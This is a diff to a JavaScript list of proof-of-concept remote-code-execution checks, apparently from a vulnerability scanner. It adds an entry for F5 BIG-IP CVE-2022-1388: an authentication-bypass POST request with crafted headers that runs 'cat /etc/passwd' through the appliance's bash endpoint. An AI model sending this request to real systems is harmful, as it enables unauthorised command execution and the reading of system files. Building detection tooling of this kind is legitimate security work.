@@ -41,7 +41,7 @@ export const poc = [{
     tags: ["apache"],
     cat: "skull",
     critLevel: 3
-},{
+}, {
     // UNTESTED!!!
     title: "RCE: Cisco Hyperflex (CVE-2021-1497)",
     rootPaths: [
@@ -51,7 +51,7 @@ export const poc = [{
     tags: ["cisco"],
     cat: "skull",
     critLevel: 3
-},{
+}, {
     // UNTESTED!!!
     title: "RCE: Citrix (CVE-2019-19781)",
     rootPaths: [
@@ -69,6 +69,25 @@ export const poc = [{
     ],
     detectStatusCodes: ["200"],
     tags: ["weblogic"],
+    cat: "cat-panic",
+    critLevel: 3
+}, {
+    // UNTESTED
+    title: "RCE: Big-IP (CVE-2022-1388)",
+    method: "POST",
+    rootPaths: [
+        "/mgmt/tm/util/bash"
+    ],
+    headers: {
+        'Host': '127.0.0.1',
+        'Authorization': 'Basic YWRtaW46aG9yaXpvbjM=',
+        'X-F5-Auth-Token': 'asdf',
+        'Connection': 'X-F5-Auth-Token',
+        'Content-Type': 'application/json'
+    },
+    postJSON: { "command": "run", "utilCmdArgs": "-c 'cat /etc/passwd}'" },
+    detectResponses: ["root"],
+    tags: ["big-ip"],
     cat: "cat-panic",
     critLevel: 3
 }]
